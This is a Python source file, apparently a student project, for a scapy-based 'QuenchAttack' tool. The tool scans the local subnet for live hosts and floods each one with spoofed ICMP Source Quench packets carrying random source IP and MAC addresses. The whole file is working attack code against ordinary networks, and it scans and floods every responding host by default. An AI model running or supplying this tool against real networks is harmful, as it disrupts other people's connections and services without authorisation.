from scapy.all import *
from getmac import get_mac_address
import socket

# Adam: Encapsulated attack code in a class format (code restructuring for clarity).
# Rami: Send_ICMPblind_packet, prepare, start (self) functions.  
# Hussein Fakih: Get IP and MAC addresses function, automatic mac and IP address function. 
class QuenchAttack:
    def __init__(self, packetsToSend, delay = "", LimitIps = ""):
        self.packetsToSend = packetsToSend
        self.delay = delay
        self.LimitIps = LimitIps

    # Automatically get MAC address if IP exists on network, written by Hussein Fakih
    def GetMacAddress(self, IP):
        mac = get_mac_address(ip=IP)
        return mac

    # Build and send an ICMP Source Quench packet, written by Rami
    def send_icmpBlind_packet(self, src_ip, dest_ip, src_mac, dest_mac, src_port, dest_port):
        eth_h = Ether(src=src_mac, dst=dest_mac)
        ip_h = IP(dst=dest_ip, src=src_ip)
        icmp_h = ICMP(type=4, code=4)
        ip2_h = IP(dst=dest_ip, src=src_ip, proto=6, flags=0x02)
        tcp2_h = TCP(sport=src_port, dport=dest_port)
        pkt = eth_h/ip_h/icmp_h/ip2_h/tcp2_h
        sendp(pkt, verbose=0)

    # Prepare inputs for packet, written by Rami
    def prepare(self, packetsToSend, Ips, Macs, delay):
        lenOfIps = len(Ips)
        print("Sending ICMP Quench...")
        for i in range (packetsToSend):
            src_ip = RandIP()
            src_mac = RandMAC()
            src_port = random.randint(1024, 49151)
            dest_port = random.randint(1024, 49151)
            for j in range (lenOfIps):
                dest_ip = Ips[j]
                dest_mac = Macs[j]
                self.send_icmpBlind_packet(src_ip, dest_ip, src_mac, dest_mac, src_port, dest_port)
            print("ICMP Source Quench batch: " + str(i+1) + " sent. Sleeping for: " + str(delay) + "s")
            time.sleep(delay)

    # Gets all active IPs and MACs on local area with IPs 192.168.1.1/24, written by Hussein Fakih
    def GetAllIPsOnNetwork(self, Iplimit):
        # Finds local IP of computer to help in finding all IPs assuming /24 subnetmask
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 1))
        IPAddr = s.getsockname()[0] # Added by Adam (previous IP detection method sometimes uses the loopback interface; this fixes the issue)

        for i in range (len(IPAddr)-1,-1,-1):
            if (IPAddr[i]=="."):
                break
        IP=IPAddr[0:i+1]
        IpThatResponded=[]
        correspondingMacAddress=[]
        if (Iplimit==None):
            Iplimit=254
        print("Scanning all Hosts...")
        for i in range (1,Iplimit+1):
            nededIp=IP+str(i)
            if (nededIp!=IPAddr):
                res=self.GetMacAddress(nededIp)
            else:
                res=None
            if (res != None):
                print("IP: "+ nededIp+ " Mac: "+str(res)+" UP")
                IpThatResponded.append(nededIp)
                correspondingMacAddress.append(res)
            else:
                print("IP: " + nededIp+ " Down")
        if (len(IpThatResponded)==0):
            print("No IP address up!")
            sys.exit()
        return[IpThatResponded,correspondingMacAddress]



    # Starts attack by checking inputs and calling GetAllIPsOnNetwork(), written by Rami
    def start(self):
        nededLimit = False
        try:
            packetsToSend=int(self.packetsToSend)
        except:
            print("Packet to send input must be an integer!")
            sys.exit(2)

        if (len(self.LimitIps)!=0):
            nededLimit=True
            try:
                LimitIps = int(self.LimitIps)
            except:
                print("IP limit input must be an integer!")
                sys.exit(2)

        if (len(self.delay)!=0):
            try:
                delay = float(self.delay)
            except:
                print("Delay input must be a float!")
                sys.exit(2)
        else:
            delay=0

        if not(nededLimit):
            IpMac=self.GetAllIPsOnNetwork(None)
        else:
            IpMac = self.GetAllIPsOnNetwork(LimitIps)
        IPs=IpMac[0]
        Macs=IpMac[1]
        self.prepare(packetsToSend, IPs, Macs, delay)


if __name__ == "__main__":
    attack = QuenchAttack(packetsToSend = 100)
    attack.start()